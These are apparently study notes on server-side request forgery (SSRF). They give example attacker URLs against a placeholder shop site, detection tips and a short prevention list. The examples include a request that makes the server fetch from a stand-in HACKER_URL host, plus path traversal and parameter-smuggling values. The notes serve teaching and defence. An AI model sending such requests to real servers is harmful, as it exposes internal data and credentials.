allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing

a lot of trial and error will be required to find a working payload

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as https://requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

-   Access to unauthorised areas
-   Access to customer/organisational data
-   Ability to Scale to internal networks
-   Reveal authentication tokens/credentials

# Examples 
the server expects an endpoint or URL to fetch data from:

## Normal URL
**Expected Request:**
`http://my-shop.de/stock?url=http://api.my-shop.de/api/stock/item?id=123`
**Hacker Request:**
`http://my-shop.de/stock?url=http://api.my-shop.de/api/user` to get user data
`http://my-shop.de/stock?url=http://HACKER_URL/malicious/file` to provide a different url to fetch (executable) data from

## directory traversal
where only the url path can be provided
**Expected Request:**
`http://my-shop.de/stock?url=/item&id=123`
**Hacker Request:**
`http://my-shop.de/stock?url=/../user` to get user data

## concattenated URL
some web apps let us provide a subdomain which is then concattenated with the second-level domain and TLD.
we could by pass that with `&x=` to interrupt the rest 
**Expected Request:**
`http://my-shop.de/stock?server=api&id=123` which is concattteated to: `http://my-shop.de/stock?server=api.my-shop.de/api/stock/item&?id=123`
**Hacker Request:**
`http://my-shop.de/stock?server=api.my-shop.de/api/user&x=&id=123` to get user data


# Finding a SSRF vulnurability
## full URL in Parameter
`http://my-shop.de/stock?url=http://api.my-shop.de/api/stock/item?id=123`
## partial URL in Parameter e.g. Hostname
`http://my-shop.de/stock?server=api`
## only path of URL in parameter
`http://my-shop.de/stock?destination=/item&id=123`
## Forms and input
in the HTML Forms some forms and inputs allow to enter a full / partial URL as value.
e.g. to select a avatar or sth like that where the path of the avatar is provided and loaded -> here we could enter a different value


# How to prevent SSRF
1. Allow List 
2. Deny List
3. validating user input
4. replace values to prevent path / directory traversal